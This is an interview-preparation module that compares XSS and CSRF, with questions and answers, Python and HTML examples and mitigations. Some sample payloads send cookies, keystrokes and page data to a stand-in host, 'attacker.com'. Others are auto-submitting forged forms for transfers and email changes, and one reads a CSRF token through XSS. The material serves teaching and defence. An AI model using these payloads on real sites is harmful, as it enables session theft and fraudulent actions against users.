# XSS vs CSRF - Interview Questions & Answers

<!-- interview-module:v1 -->

> **How to use this interview module**
>
> **Practice:** Cover each answer, then explain it aloud in **60–120 seconds**. Add **one concrete example** from work or a lab.
>
> **Pair with:** the **Comprehensive Guide** and **Critical Clarification** for this topic (if present).

---


---

## **Comparison Questions**

### **Q1: What are the key differences between XSS and CSRF?**

**Answer:**

**1. Attack Goal:**

- **XSS**: Execute malicious scripts in victim's browser
- **CSRF**: Trick victim into submitting requests

**2. Execution Location:**

- **XSS**: Client-side (browser)
- **CSRF**: Server-side (server processes request)

**3. Target:**

- **XSS**: Other users viewing the page
- **CSRF**: Authenticated users (usually the victim)

**4. Attack Vector:**

- **XSS**: Script injection
- **CSRF**: Form submission

**5. Prevention:**

- **XSS**: Output encoding, CSP
- **CSRF**: CSRF tokens, SameSite cookies

**6. Requirements:**

- **XSS**: User input reflected/stored (doesn't require authentication)
- **CSRF**: User authentication required

---

### **Q2: Does preventing XSS also prevent CSRF?**

**Answer:**

**No, preventing XSS does not prevent CSRF.** They are different vulnerabilities requiring different mitigation strategies.

**XSS Prevention:**

- Output encoding
- Content Security Policy (CSP)
- Input validation

**CSRF Prevention:**

- CSRF tokens
- SameSite cookies
- Origin/Referer header validation

**Example:**

```python
# Protected against XSS
def display_comment(comment):
    return escape(comment)  # Prevents XSS

# But still vulnerable to CSRF
@app.route('/delete', methods=['POST'])
def delete_post():
    post_id = request.form.get('id')
    delete_post(post_id)  # Vulnerable to CSRF!

```

**Key Point:** Both vulnerabilities must be addressed separately with appropriate mitigations.

---

## **Fundamental Questions**

### **Q3: Can CSRF work without XSS?**

**Answer:**

**Yes, CSRF can work without XSS.** CSRF exploits browser's automatic cookie sending behavior, not script execution.

**CSRF Attack (No XSS Required):**

```html
<!-- Attacker's malicious page (evil.com) -->
<form id="transfer" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('transfer').submit();</script>

```

**How It Works:**

1. Victim visits attacker's page
2. Form automatically submits to bank.com
3. Browser includes session cookie (automatic behavior)
4. Bank processes transfer (trusts cookie)

**No XSS vulnerability required!**

---

### **Q4: Can XSS be used to steal more than just cookies?**

**Answer:**

**Yes, XSS can be used for multiple attack vectors:**

**1. Cookie Theft:**

```jsx
fetch('http://attacker.com/steal?cookie=' + document.cookie);

```

**2. Keylogging:**

```jsx
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/steal?key=' + e.key);
});

```

**3. Phishing:**

```jsx
// Inject fake login form
document.body.innerHTML = '<form>...</form>';

```

**4. Data Theft:**

```jsx
var data = document.getElementById('sensitive-data').innerHTML;
fetch('http://attacker.com/steal?data=' + data);

```

**5. Defacement:**

```jsx
document.body.innerHTML = '<h1>HACKED</h1>';

```

**Key Point:** XSS is much more versatile than just cookie theft.

---

## **Mitigation Questions**

### **Q5: How do you prevent both XSS and CSRF?**

**Answer:**

**XSS Prevention:**

```python
# 1. Output encoding
from html import escape
def display_comment(comment):
    return escape(comment)

# 2. Content Security Policy
# Content-Security-Policy: default-src 'self'; script-src 'self'

# 3. HttpOnly cookies
# Set-Cookie: session=abc123; HttpOnly; Secure

```

**CSRF Prevention:**

```python
# 1. CSRF tokens
@app.route('/transfer', methods=['POST'])
def transfer():
    token = request.form.get('csrf_token')
    if not validate_csrf_token(token):
        return "Invalid CSRF token", 403
    # Process transfer

# 2. SameSite cookies
# Set-Cookie: session=abc123; SameSite=Strict; Secure

# 3. Origin header validation
if request.headers.get('Origin') != 'https://example.com':
    return "Invalid origin", 403

```

**Best Practice:** Implement both XSS and CSRF protection using defense in depth.

---

## **Scenario-Based Questions**

### **Q6: An attacker wants to change a user's email address. Would they use XSS or CSRF?**

**Answer:**

**They could use either, but CSRF is more common:**

**CSRF Approach (Common):**

```html
<!-- Attacker's malicious page -->
<form action="https://site.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

```

**XSS Approach (Less Common, Requires XSS Vulnerability):**

```jsx
// Requires XSS vulnerability first
fetch('/change-email', {
    method: 'POST',
    body: 'email=attacker@evil.com'
});

```

**Why CSRF is More Common:**

- Doesn't require existing XSS vulnerability
- Simpler attack vector
- Works if user is authenticated

**Key Point:** CSRF is typically used for state-changing operations like changing email addresses.

---

### **Q7: Can XSS and CSRF be combined in an attack?**

**Answer:**

**Yes, XSS can be used to bypass CSRF protection:**

**Scenario:**

1. XSS vulnerability allows script injection
2. Script reads CSRF token from page
3. Script uses token to perform CSRF attack

**Attack:**

```jsx
// 1. XSS payload reads CSRF token
var csrf_token = document.querySelector('input[name="csrf_token"]').value;

// 2. Use token to perform CSRF attack
fetch('/transfer', {
    method: 'POST',
    body: 'amount=10000&to=attacker&csrf_token=' + csrf_token
});

```

**Mitigation:**

- Prevent XSS (output encoding)
- Store CSRF tokens in HttpOnly cookies
- Use additional validation beyond tokens

**Key Point:** XSS can be used to bypass CSRF protection, making both vulnerabilities dangerous when combined.

---

## **Summary**

**Key Differences:**

- XSS executes scripts in browser; CSRF submits requests to server
- XSS targets other users; CSRF targets authenticated users
- XSS prevented by output encoding; CSRF prevented by tokens
- XSS doesn't require authentication; CSRF requires authentication

**Key Similarities:**

- Both are "cross-site" attacks
- Both exploit trust mechanisms
- Both can lead to account compromise
- Both require defense in depth

**Remember:** XSS and CSRF are different vulnerabilities requiring different mitigation strategies. Both must be addressed separately!

---

## Depth: Interview follow-ups — XSS vs CSRF

**Authoritative references:** OWASP cheat sheets for [XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

**Follow-ups:**
- **One sentence distinction:** XSS executes script in victim browser; CSRF forges cross-site *requests* using the victim’s cookies/session.
- **Can CSRF tokens stop XSS?** (No—attacker reads token via XSS.)
- **Defense pairing:** HttpOnly limits token theft but not CSRF action while session alive.

**Production verification:** Separate test cases for stored XSS vs CSRF on state-changing routes.

**Cross-read:** XSS, CSRF, Cookie Security.

<!-- verified-depth-merged:v1 ids=xss-vs-csrf -->
